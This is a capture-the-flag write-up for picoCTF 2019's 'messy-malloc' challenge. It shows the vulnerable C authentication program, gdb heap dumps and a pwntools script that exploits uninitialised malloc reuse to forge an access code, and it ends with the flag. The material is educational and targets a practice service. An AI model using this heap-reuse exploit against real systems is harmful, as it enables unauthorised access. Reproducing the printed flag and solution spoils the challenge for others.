# Problem
Can you take advantage of misused malloc calls to leak the secret through this [service](https://2019shell1.picoctf.com/static/d6bc4c1d3e2010b46bb2f20421f3efdc/auth) and get the flag? Connect with nc 2019shell1.picoctf.com 21899. [Source](https://2019shell1.picoctf.com/static/d6bc4c1d3e2010b46bb2f20421f3efdc/auth.c).

## Hints:

If only the program used calloc to zero out the memory..

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/d6bc4c1d3e2010b46bb2f20421f3efdc/auth
wget https://2019shell1.picoctf.com/static/d6bc4c1d3e2010b46bb2f20421f3efdc/auth.c
chmod +x ./auth
```

First, we investigate the source:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define LINE_MAX 256
#define ACCESS_CODE_LEN 16
#define FLAG_SIZE 64

struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN];
  char *files;
};

struct user anon_user;
struct user *u;

void print_flag() {
  char flag[FLAG_SIZE];
  FILE *f = fopen("flag.txt", "r");
  if (f == NULL) {
    printf("Please make sure flag.txt exists\n");
    exit(0);
  }

  if ((fgets(flag, FLAG_SIZE, f)) == NULL){
    puts("Couldn't read flag file.");
    exit(1);
  };

  unsigned long ac1 = ((unsigned long *)u->access_code)[0];
  unsigned long ac2 = ((unsigned long *)u->access_code)[1];
  if (ac1 != 0x4343415f544f4f52 || ac2 != 0x45444f435f535345) {
    fprintf(stdout, "Incorrect Access Code: \"");
    for (int i = 0; i < ACCESS_CODE_LEN; i++) {
      putchar(u->access_code[i]);
    }
    fprintf(stdout, "\"\n");
    return;
  }
  
  puts(flag);
  fclose(f);
}

void menu() {
  puts("Commands:");
  puts("\tlogin - login as a user");
  puts("\tprint-flag - print the flag");
  puts("\tlogout - log out");
  puts("\tquit - exit the program");
}
 
const char *get_username(struct user *u) {
  if (u->username == NULL) {
    return "anon";
  }
  else {
    return u->username;
  }
}

int login() {
  u = malloc(sizeof(struct user));

  int username_len;
  puts("Please enter the length of your username");
  scanf("%d", &username_len);
  getc(stdin);

  char *username = malloc(username_len+1);
  u->username = username;

  puts("Please enter your username");
  if (fgets(username, username_len, stdin) == NULL) {
    puts("fgets failed");
    exit(-1);
  }

  char *end;
  if ((end=strchr(username, '\n')) != NULL) {
    end[0] = '\0';
  }
  
  return 0;
  
}

int logout() {
  char *user = u->username;
  if (u == &anon_user) {
    return -1;
  }
  else {
    free(u);
    free(user);
    u = &anon_user;
  }
  return 0;
}

int main(int argc, char **argv) {

  setbuf(stdout, NULL);

  char buf[LINE_MAX];

  memset(anon_user.access_code, 0, ACCESS_CODE_LEN);
  anon_user.username = NULL;

  u = &anon_user;
  
  menu();

  while(1) {
    puts("\nEnter your command:");
    fprintf(stdout, "[%s]> ", get_username(u));

    if(fgets(buf, LINE_MAX, stdin) == NULL)
      break;

    if (!strncmp(buf, "login", 5)){
      login();
    }
    else if(!strncmp(buf, "print-flag", 10)){
      print_flag();
    }
    else if(!strncmp(buf, "logout", 6)){
      logout();
    }
    else if(!strncmp(buf, "quit", 4)){
      return 0;
    }
    else{
      puts("Invalid option");
      menu();
    }
  }
}
```

In this challenge we will start messing with the heap.

This program lets us do few things:
* show - shows our name and level.
* login - we enter the length of the name, followed by the name. allocates new ```user``` and a new buffer for ```username``` and puts out name in it.
* print-flag - if the current user's access code is ```0x4343415f544f4f52 | 0x45444f435f535345``` (in the proper endianness), prints the flag.
* logout - if logged in, free ```user``` and ```user->username``` and set pointer to the default user ```anon_user```.
* quit - just quits.

The ```user``` struct is:
```c
struct user {
  char *username;
  char access_code[ACCESS_CODE_LEN];
  char *files;
};
```

Lets debug the program and look at the heap after one allocation.

```bash
roee@Roee-Ubuntu:~/CTFs-Writeups/picoCTF-2019/Binary/11-messy_malloc-300$ gdb ./auth 
GNU gdb (Ubuntu 8.2.91.20190405-0ubuntu3) 8.2.91.20190405-git
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./auth...
gdb-peda$ b *0x0000000000400d3d
Breakpoint 1 at 0x400d3d: file /usr/include/x86_64-linux-gnu/bits/stdio2.h, line 262.
gdb-peda$ run
Starting program: /home/roee/CTFs-Writeups/picoCTF-2019/Binary/11-messy_malloc-300/auth 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Commands:
  login - login as a user
  print-flag - print the flag
  logout - log out
  quit - exit the program

Enter your command:

Breakpoint 1, 0x0000000000400d3d in fgets (__stream=<optimized out>, __n=0x100, __s=0x7fffffffda70 "") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:262
262       if ((size_t) __n > __bos (__s))
gdb-peda$ c
Continuing.
login
Please enter the length of your username
10
Please enter your username
roee

Enter your command:

Breakpoint 1, 0x0000000000400d3d in fgets (__stream=<optimized out>, __n=0x100, __s=0x7fffffffda70 "login\n") at /usr/include/x86_64-linux-gnu/bits/stdio2.h:262
262       if ((size_t) __n > __bos (__s))
gdb-peda$ info proc mappings
process 15203
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
            0x400000           0x402000     0x2000        0x0 /home/roee/CTFs-Writeups/picoCTF-2019/Binary/11-messy_malloc-300/auth
            0x601000           0x602000     0x1000     0x1000 /home/roee/CTFs-Writeups/picoCTF-2019/Binary/11-messy_malloc-300/auth
            0x602000           0x603000     0x1000     0x2000 /home/roee/CTFs-Writeups/picoCTF-2019/Binary/11-messy_malloc-300/auth
            0x603000           0x624000    0x21000        0x0 [heap]
      0x7ffff7b7b000     0x7ffff7b7d000     0x2000        0x0 
      0x7ffff7b7d000     0x7ffff7b84000     0x7000        0x0 /lib/x86_64-linux-gnu/libpthread-2.29.so
      0x7ffff7b84000     0x7ffff7b93000     0xf000     0x7000 /lib/x86_64-linux-gnu/libpthread-2.29.so
      0x7ffff7b93000     0x7ffff7b98000     0x5000    0x16000 /lib/x86_64-linux-gnu/libpthread-2.29.so
      0x7ffff7b98000     0x7ffff7b99000     0x1000    0x1a000 /lib/x86_64-linux-gnu/libpthread-2.29.so
      0x7ffff7b99000     0x7ffff7b9a000     0x1000    0x1b000 /lib/x86_64-linux-gnu/libpthread-2.29.so
      0x7ffff7b9a000     0x7ffff7b9e000     0x4000        0x0 
      0x7ffff7b9e000     0x7ffff7b9f000     0x1000        0x0 /lib/x86_64-linux-gnu/libdl-2.29.so
      0x7ffff7b9f000     0x7ffff7ba1000     0x2000     0x1000 /lib/x86_64-linux-gnu/libdl-2.29.so
      0x7ffff7ba1000     0x7ffff7ba2000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.29.so
      0x7ffff7ba2000     0x7ffff7ba3000     0x1000     0x3000 /lib/x86_64-linux-gnu/libdl-2.29.so
      0x7ffff7ba3000     0x7ffff7ba4000     0x1000     0x4000 /lib/x86_64-linux-gnu/libdl-2.29.so
      0x7ffff7ba4000     0x7ffff7bc9000    0x25000        0x0 /lib/x86_64-linux-gnu/libc-2.29.so
      0x7ffff7bc9000     0x7ffff7d3c000   0x173000    0x25000 /lib/x86_64-linux-gnu/libc-2.29.so
      0x7ffff7d3c000     0x7ffff7d85000    0x49000   0x198000 /lib/x86_64-linux-gnu/libc-2.29.so
      0x7ffff7d85000     0x7ffff7d88000     0x3000   0x1e0000 /lib/x86_64-linux-gnu/libc-2.29.so
      0x7ffff7d88000     0x7ffff7d8b000     0x3000   0x1e3000 /lib/x86_64-linux-gnu/libc-2.29.so
      0x7ffff7d8b000     0x7ffff7d8f000     0x4000        0x0 
      0x7ffff7d8f000     0x7ffff7d95000     0x6000        0x0 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      0x7ffff7d95000     0x7ffff7f94000   0x1ff000     0x6000 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      0x7ffff7f94000     0x7ffff7f95000     0x1000     0x5000 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      0x7ffff7f95000     0x7ffff7f96000     0x1000     0x6000 /usr/lib/x86_64-linux-gnu/libgtk3-nocsd.so.0
      0x7ffff7f96000     0x7ffff7f98000     0x2000        0x0 
      0x7ffff7fce000     0x7ffff7fd1000     0x3000        0x0 [vvar]
      0x7ffff7fd1000     0x7ffff7fd2000     0x1000        0x0 [vdso]
      0x7ffff7fd2000     0x7ffff7fd3000     0x1000        0x0 /lib/x86_64-linux-gnu/ld-2.29.so
      0x7ffff7fd3000     0x7ffff7ff4000    0x21000     0x1000 /lib/x86_64-linux-gnu/ld-2.29.so
      0x7ffff7ff4000     0x7ffff7ffc000     0x8000    0x22000 /lib/x86_64-linux-gnu/ld-2.29.so
      0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x29000 /lib/x86_64-linux-gnu/ld-2.29.so
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x2a000 /lib/x86_64-linux-gnu/ld-2.29.so
      0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
gdb-peda$ x/1000wx 0x603000
0x603000: 0x00000000  0x00000000  0x00000251  0x00000000
0x603010: 0x00000000  0x00000000  0x00000000  0x00000000
0x603020: 0x00000000  0x00000000  0x00000000  0x00000000
0x603030: 0x00000000  0x00000000  0x00000000  0x00000000
...
0x603220: 0x00000000  0x00000000  0x00000000  0x00000000
0x603230: 0x00000000  0x00000000  0x00000000  0x00000000
0x603240: 0x00000000  0x00000000  0x00000000  0x00000000
0x603250: 0x00000000  0x00000000  0x00000411  0x00000000
0x603260: 0x65656f72  0x00000a0a  0x00000000  0x00000000
0x603270: 0x00000000  0x00000000  0x00000000  0x00000000
0x603280: 0x00000000  0x00000000  0x00000000  0x00000000
...
0x603630: 0x00000000  0x00000000  0x00000000  0x00000000
0x603640: 0x00000000  0x00000000  0x00000000  0x00000000
0x603650: 0x00000000  0x00000000  0x00000000  0x00000000
0x603660: 0x00000000  0x00000000  0x00000031  0x00000000
0x603670: 0x006036a0  0x00000000  0x00000000  0x00000000
0x603680: 0x00000000  0x00000000  0x00000000  0x00000000
0x603690: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036a0: 0x65656f72  0x00000000  0x00000000  0x00000000
0x6036b0: 0x00000000  0x00000000  0x00020951  0x00000000
0x6036c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036d0: 0x00000000  0x00000000  0x00000000  0x00000000
...
0x603f90: 0x00000000  0x00000000  0x00000000  0x00000000
gdb-peda$ 
```

There are two allocations (the second is for the ```username```, as we can see: ```0x65656f72``` = 'roee'),
and the next free chunk is at ```0x6036a0```.

Now lets login as ```a``` and take another look:

```bash
gdb-peda$ c
Continuing.

login
Please enter the length of your username
10
Please enter your username
a

gdb-peda$ x/100wx 0x603680
0x603680: 0x00000000  0x00000000  0x00000000  0x00000000
0x603690: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036a0: 0x65656f72  0x00000000  0x00000000  0x00000000
0x6036b0: 0x00000000  0x00000000  0x00000031  0x00000000
0x6036c0: 0x006036f0  0x00000000  0x00000000  0x00000000
0x6036d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036e0: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603700: 0x00000000  0x00000000  0x00000031  0x00000000
0x603710: 0x00603740  0x00000000  0x00000000  0x00000000
0x603720: 0x00000000  0x00000000  0x00000000  0x00000000
0x603730: 0x00000000  0x00000000  0x00000021  0x00000000
0x603740: 0x00000061  0x00000000  0x00000000  0x00000000
0x603750: 0x00000000  0x00000000  0x000208b1  0x00000000
```

We can see two new allocations:
* 0x6036a0 - The ```user``` struct (user->name = 0x00603740)
* 0x603710 - For ```user->username``` (contains 0x00000061 = "a")

Now lets reset and login again as ```aaaaaaaaa```:

```bash
gdb-peda$ c
Continuing.
logout

gdb-peda$ c
Continuing.
login
Please enter the length of your username
20
Please enter your username
aaaaaaaaa

gdb-peda$ x/100wx 0x603660
0x603660: 0x00000000  0x00000000  0x00000031  0x00000000
0x603670: 0x006036a0  0x00000000  0x00000000  0x00000000
0x603680: 0x00000000  0x00000000  0x00000000  0x00000000
0x603690: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036a0: 0x65656f72  0x00000000  0x00000000  0x00000000
0x6036b0: 0x00000000  0x00000000  0x00000031  0x00000000
0x6036c0: 0x006036f0  0x00000000  0x00000000  0x00000000
0x6036d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6036e0: 0x00000000  0x00000000  0x00000021  0x00000000
0x6036f0: 0x00000000  0x00000000  0x00000000  0x00000000
0x603700: 0x00000000  0x00000000  0x00000031  0x00000000
0x603710: 0x00603740  0x00000000  0x00000000  0x00000000
0x603720: 0x00000000  0x00000000  0x00000000  0x00000000
0x603730: 0x00000000  0x00000000  0x00000021  0x00000000
0x603740: 0x61616161  0x61616161  0x00000061  0x00000000
0x603750: 0x00000000  0x00000000  0x000208b1  0x00000000
0x603760: 0x00000000  0x00000000  0x00000000  0x00000000
0x603770: 0x00000000  0x00000000  0x00000000  0x00000000
0x603780: 0x00000000  0x00000000  0x00000000  0x00000000
0x603790: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037a0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037b0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037c0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037d0: 0x00000000  0x00000000  0x00000000  0x00000000
0x6037e0: 0x00000000  0x00000000  0x00000000  0x00000000
gdb-peda$ 
```

Let's try a bigger malloc, this time we execute it on the remote server:
```bash
nc 2019shell1.picoctf.com 21899

Commands:
  login - login as a user
  print-flag - print the flag
  logout - log out
  quit - exit the program

Enter your command:
[anon]> login
Please enter the length of your username
32
Please enter your username
0123456789ABCDEFGHIJKLMNOP

Enter your command:
[0123456789ABCDEFGHIJKLMNOP]> logout

Enter your command:
[anon]> login
Please enter the length of your username
32
Please enter your username
a

Enter your command:
[a]> print-flag
Incorrect Access Code: "89ABCDEFGHIJKLMN"

Enter your command:
[a]> 
```

As we can see the new ```user``` is allocated in the place of the last ```username```. We can manipulate memory:
```python
#!/usr/bin/env python

from pwn import *


r = remote('2019shell1.picoctf.com',  21899)

# Set access-code
print r.recvuntil('[anon]> '),
r.sendline('login')
print 'login'

print r.recvuntil('Please enter the length of your username\n'),
r.sendline('32')
print 32

print r.recvuntil('Please enter your username\n'),
r.sendline('{}'.format('A' * 8 + p64(0x4343415f544f4f52) + p64(0x45444f435f535345)))
print '{}'.format('A' * 8 + p64(0x4343415f544f4f52) + p64(0x45444f435f535345))


print r.recvuntil('> '),
r.sendline('logout')
print 'logout'

print r.recvuntil('[anon]> '),
r.sendline('login')
print 'login'

print r.recvuntil('Please enter the length of your username\n'),
r.sendline('32')
print 32

print r.recvuntil('Please enter your username\n'),
r.sendline('{}'.format('A'))
print 'A'

print r.recvuntil('[A]> '),
r.sendline('print-flag')
print 'print-flag'

print r.recv(),
```

Nice!

Flag: picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ac0e0e6a}
